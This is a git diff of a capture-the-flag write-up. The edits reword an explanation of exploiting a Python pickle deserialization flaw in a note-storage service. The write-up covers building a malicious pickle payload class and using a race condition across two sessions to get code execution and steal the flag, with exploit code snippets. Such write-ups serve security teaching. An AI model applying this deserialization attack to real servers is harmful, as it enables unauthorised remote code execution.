@@ -12,12 +12,12 @@
 This challenge consists in accessing a file inside the server running the script.
 The script allows users to create users and create or read files. 
 An important concept is that files can be created in either CLASSY or FREE mode and can only be read in the same mode, otherwise the file is deleted.
-The CLASSY mode uses `pickle` to serialize and deserialize the files, while the FREE mode uses plain text to store the notes. 
-The `pickle` library which is known to be vulnerable to remote code execution, [source](https://davidhamann.de/2020/04/05/exploiting-python-pickle/). 
+The CLASSY mode uses `pickle` to serialize and deserialize the content of the files, while the FREE mode stores information using plain text. 
+The `pickle` library is known to be vulnerable to remote code execution, [source](https://davidhamann.de/2020/04/05/exploiting-python-pickle/). 
 
 ## Exploit
 
-Since the `pickle.dump` function is exploitable, the next step is to create a malicious payload.
+Since the `pickle.dump` function is exploitable, the first step is to create a malicious payload to steal the flag.
 ```python
 class FlagGrabber:
     def __reduce__(self):
@@ -26,8 +26,8 @@ class FlagGrabber:
 
 pickled = pickle.dumps(FlagGrabber())
 ```
-From the source cited above, we can see that the `__reduce__` function is called when the object is deserialized and leads to remote code execution.  
-The problem is that the script doesn't serialize the user input but the `Note` object
+From the source cited above, we can see that the `__reduce__` function is called when the object is deserialized and leads to the execution of `cmd` in the server.  
+The problem is that the script in `CLASSY_MODE` doesn't serialize the user input but the `Note` object
 ```python
 note = pickle.loads(note_content)
 print(note)
@@ -36,14 +36,14 @@ note = Note(note_name, note_content)
 with open(note_path, 'wb') as f:
     pickle.dump(note, f)
 ```
-Therefore, the payload must be sent written to the file using the FREE_MODE.
-To be able to write with FREE_MODE and later read with CLASSY_MODE, it's necessary to exploit a race condition in the verification of the user mode choice.
+Therefore, the payload must be written to the file using the `FREE_MODE`.
+To be able to write with `FREE_MODE` and later read with `CLASSY_MODE`, it's necessary to exploit a race condition in the verification of the user mode choice.
 ```python
 if not check_mode(FREE_MODE):
     reset(FREE_MODE)
 ```
 First create two sessions (`free` and `classy`) with the same user.
-Then, in the `free` session, enter the FREE_MODE and in the `classy` enter the CLASSY_MODE.
+Then, in the `free` session, enter the `FREE_MODE` and in the `classy` enter the `CLASSY_MODE`.
 ```python
 classy.recvuntil(b'Username: ')
 classy.send(b'diogo\n')
